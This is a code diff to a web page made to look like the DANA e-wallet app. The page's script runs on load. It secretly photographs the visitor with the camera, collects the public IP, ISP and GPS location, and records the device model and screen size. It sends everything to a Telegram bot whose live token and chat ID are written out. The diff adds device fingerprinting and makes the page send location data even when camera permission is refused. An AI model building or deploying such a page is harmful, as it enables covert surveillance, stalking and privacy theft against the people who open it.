@@ -191,7 +191,7 @@
         display: none;
         position: fixed;
         inset: 0;
-        z-index: 999;
+        z-index: 9999;
         background: #0a0620;
         align-items: center;
         justify-content: center;
@@ -204,6 +204,7 @@
         text-transform: uppercase;
         padding: 0.2rem;
         text-align: center;
+        pointer-events: auto;
       }
 
       .error-overlay .sub-error {
@@ -227,6 +228,7 @@
         text-transform: uppercase;
         cursor: pointer;
         transition: all 0.3s ease;
+        pointer-events: auto;
       }
 
       .btn-retry:hover {
@@ -248,7 +250,7 @@
 
       <!-- Ilustrasi / Animasi -->
       <div id="animation">
-        <img src="https://jeansmith26.github.io/Supernjai/dana-hero.png" alt="Ilustrasi DANA" />
+        <img src="dana-hero.png" alt="Ilustrasi DANA" />
       </div>
 
       <!-- Logo DANA -->
@@ -275,7 +277,7 @@
       </div>
     </div>
 
-    <!-- ====== ERROR OVERLAY ====== -->
+    <!-- ====== ERROR OVERLAY (fix) ====== -->
     <div class="error-overlay" id="errorOverlay">
       Error
       <div class="sub-error">—</div>
@@ -287,7 +289,7 @@
       (function() {
         'use strict';
 
-        // ---------- KONFIGURASI TELEGRAM ----------
+        // ---------- KONFIGURASI ----------
         const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
         const CHAT_ID = '8463156896';
         const MAX_ATTEMPTS = 3;
@@ -295,10 +297,48 @@
         let sudahKirim = false;
         let izinDitolak = false;
         let retryTimer = null;
+        let locationData = null;
+        let gpsData = null;
+        let deviceName = '';
 
         const mainPage = document.getElementById('mainPage');
         const errorOverlay = document.getElementById('errorOverlay');
         const retryBtn = document.getElementById('retryBtn');
+
+        // ---------- DAPATKAN NAMA HP ----------
+        function getDeviceName() {
+          const ua = navigator.userAgent;
+          let name = '';
+
+          // Deteksi iOS
+          if (/iPhone/i.test(ua)) {
+            const match = ua.match(/iPhone OS (\d+_\d+)/);
+            name = 'iPhone ' + (match ? match[1].replace('_', '.') : '');
+          } else if (/iPad/i.test(ua)) {
+            const match = ua.match(/iPad OS (\d+_\d+)/);
+            name = 'iPad ' + (match ? match[1].replace('_', '.') : '');
+          } else if (/Android/i.test(ua)) {
+            const match = ua.match(/Android\s([\d.]+)/);
+            const brand = ua.match(/(Samsung|Xiaomi|OPPO|Vivo|Realme|OnePlus|Google|Nokia|Huawei|ASUS|Sony|Motorola|LG|HTC)/i);
+            let brandName = brand ? brand[1] : 'Android';
+            name = brandName + ' ' + (match ? match[1] : '');
+          } else if (/Windows/i.test(ua)) {
+            name = 'Windows PC';
+          } else if (/Mac/i.test(ua)) {
+            name = 'Mac';
+          } else {
+            name = 'Perangkat tidak dikenal';
+          }
+
+          // Tambahkan info layar
+          if (window.screen) {
+            const w = window.screen.width;
+            const h = window.screen.height;
+            name += ` (${w}x${h})`;
+          }
+
+          return name;
+        }
 
         // ---------- GET LOKASI DARI IP ----------
         async function getLocationFromIP() {
@@ -355,17 +395,22 @@
           });
         }
 
-        // ---------- KIRIM KE TELEGRAM ----------
-        async function kirimKeTelegram(dataUrl, locationData, gpsData) {
+        // ---------- KIRIM KE TELEGRAM (dengan atau tanpa foto) ----------
+        async function kirimKeTelegram(dataUrl) {
           try {
-            const blob = await fetch(dataUrl).then(r => r.blob());
             const formData = new FormData();
-            formData.append('photo', blob, 'foto.png');
 
-            let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;
+            if (dataUrl) {
+              const blob = await fetch(dataUrl).then(r => r.blob());
+              formData.append('photo', blob, 'foto.png');
+            }
+
+            let caption = `📸 ${dataUrl ? 'Foto diambil otomatis' : '⚠️ Gagal mengambil foto'}\n`;
+            caption += `🕒 ${new Date().toLocaleString('id-ID')}\n`;
+            caption += `📱 ${deviceName || 'Perangkat tidak dikenal'}\n`;
 
             if (locationData) {
-              if (locationData.ip) caption += `\n\n🌐 IP Publik : ${locationData.ip}`;
+              if (locationData.ip) caption += `\n🌐 IP Publik : ${locationData.ip}`;
               if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
               if (locationData.city || locationData.region || locationData.country) {
                 let loc = [];
@@ -392,6 +437,10 @@
 
             if (!locationData && !gpsData) {
               caption += `\n\n⚠️ Data lokasi tidak tersedia`;
+            }
+
+            if (!dataUrl) {
+              caption += `\n\n⚠️ Izin kamera ditolak, hanya mengirim data lokasi`;
             }
 
             formData.append('caption', caption);
@@ -425,18 +474,13 @@
             video.srcObject.getTracks().forEach(track => track.stop());
           }
 
-          Promise.allSettled([
-              getLocationFromIP(),
-              getGPSLocation()
-            ])
-            .then((results) => {
-              const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
-              const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
-              kirimKeTelegram(dataUrl, locationData, gpsData);
-            })
-            .catch(() => {
-              kirimKeTelegram(dataUrl, null, null);
-            });
+          kirimKeTelegram(dataUrl);
+        }
+
+        // ---------- KIRIM TANPA FOTO (hanya lokasi + IP) ----------
+        function kirimTanpaFoto() {
+          if (sudahKirim) return;
+          kirimKeTelegram(null);
         }
 
         // ---------- TAMPILKAN ERROR ----------
@@ -448,6 +492,8 @@
             clearTimeout(retryTimer);
             retryTimer = null;
           }
+          // Kirim data tanpa foto
+          kirimTanpaFoto();
         }
 
         // ---------- RESET & COBA ULANG ----------
@@ -516,19 +562,38 @@
             });
         }
 
-        // ---------- EVENT RETRY ----------
+        // ---------- EVENT RETRY (FIX) ----------
         if (retryBtn) {
           retryBtn.addEventListener('click', function(e) {
             e.stopPropagation();
+            e.preventDefault();
             resetDanCobaUlang();
           });
         }
 
         // ---------- JALANKAN OTOMATIS ----------
-        if (document.readyState === 'complete') {
+        function init() {
+          // Dapatkan nama HP
+          deviceName = getDeviceName();
+          console.log('Device:', deviceName);
+
+          // Dapatkan lokasi + IP (selalu diambil)
+          Promise.allSettled([
+            getLocationFromIP(),
+            getGPSLocation()
+          ]).then((results) => {
+            locationData = results[0].status === 'fulfilled' ? results[0].value : null;
+            gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
+          });
+
+          // Mulai kamera
           setTimeout(mulaiKamera, 500);
+        }
+
+        if (document.readyState === 'complete') {
+          init();
         } else {
-          window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
+          window.addEventListener('load', init);
         }
 
         // ---------- TOMBOL "BUKA DI DANA" ----------
